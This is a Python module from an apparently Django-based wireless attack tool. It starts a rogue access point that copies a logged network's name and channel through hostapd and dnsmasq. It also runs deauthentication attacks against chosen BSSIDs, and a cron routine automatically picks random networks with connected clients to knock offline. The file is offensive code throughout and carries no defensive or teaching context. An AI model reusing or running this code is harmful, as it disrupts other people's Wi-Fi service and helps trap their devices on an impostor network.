from wifiINFO.models import *
from wifiINFO.utils import *
from wifiINFO import config
import wifiINFO.hostapd as hostpid
from wifiINFO.wifi import get_wifi, get_station

import datetime, time
import random
import traceback
import signal


def start_host(host_id):
    stop_host()
    try:
        target = Nativelog.objects.filter(id=host_id)
    except Exception as e:
        print(e)
        return False

    if target.count() < 1:
        return False

    essid, channel = target.values_list('essid','channel').first()
    if essid is None:
        return False

    dnsmasq, host = hostpid.host(essid, channel)

    config.set_value('HOST_PID', host.pid)
    config.set_value('DNSMASQ_PID', dnsmasq.pid)

    pids = {
        'host_name':essid,
        'host_pid':host.pid,
        'dnsmasq_pid':dnsmasq.pid,
    }

    return pids


def stop_host():
    try:
        os.system("sudo rm /etc/dnsmasq.conf > /dev/null 2>&1")
        dnsmasq_pid = config.get_value('DNSMASQ_PID')
        if dnsmasq_pid is not None:
            os.kill(dnsmasq_pid, signal.SIGKILL)

        os.system("sudo rm /etc/hostapd/hostapd.conf > /dev/null 2>&1")
        host_pid = config.get_value('HOST_PID')
        if host_pid is not None:
            os.kill(host_pid, signal.SIGKILL)
        time.sleep(5)
    except:
        print('\n', '>>>' * 20)
        print(traceback.print_exc())
        print('\n', '>>>' * 20)
        print(traceback.format_exc())


def attack_native_wifi(bssid, channel):
    ATKFACE = config.get_value('ATKFACE')
    try:
        deauth(ATKFACE, bssid, channel)
    except Exception as e:
        print('\n', '>>>' * 20)
        print(traceback.print_exc())
        print('\n', '>>>' * 20)
        print(traceback.format_exc())


def random_target():
    LOG = config.get_value('LOG')

    wifi_lines, station_lines = file_parse(LOG)
    new_wifi_list = get_wifi(wifi_lines)
    new_station_list = get_station(station_lines)

    channel_list = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 34, 36, 38,
                    40, 42, 44, 46, 48,52, 56, 60, 64, 100, 104, 108, 112, 116, 120,
                    124, 128, 132, 136, 140, 149,153, 157, 161, 165, 183, 184, 185, 187, 188, 189, 192, 196]

    for count in range(0,10):
        random_wifi = random.choice(new_wifi_list)
        if random_wifi['essid'] is not None and random_wifi['privacy'] in ('OPN', None) \
                and int(random_wifi['channel']) not in channel_list:
            continue
        elif not Wifilog.objects.filter(bssid=random_wifi['bssid']).exists():
            continue

        for station in new_station_list:
            if station['bssid'] == random_wifi['bssid'] and station['essid'] is None:
                return random_wifi

    return None


def cron_atk():
    if not config.get_value('MAIN_STATUS'):
        return

    if not config.get_value('ATK_STATUS'):
        return

    ATKFACE = config.get_value('ATKFACE')

    time1 = time.time()

    try:
        random_wifi = random_target()

        if random_wifi:
            bssid, channel = random_wifi['bssid'], random_wifi['channel']
            process = deauth(ATKFACE, bssid, channel)
            time.sleep(20)
            try:
                process.kill()
            except Exception as e:

                print('\n', '>>>' * 20)
                print(traceback.print_exc())
                print('\n', '>>>' * 20)
                print(traceback.format_exc())

            time2 = time.time()
            print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
            print(("{}:Attack").format(random_wifi['bssid']))
            print('CronATK消耗:{}'.format(time2 - time1))
        else:
            print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
            print("超时跳过")
    except Exception as e:

        print('\n', '>>>' * 20)
        print(traceback.print_exc())
        print('\n', '>>>' * 20)
        print(traceback.format_exc())

        return False


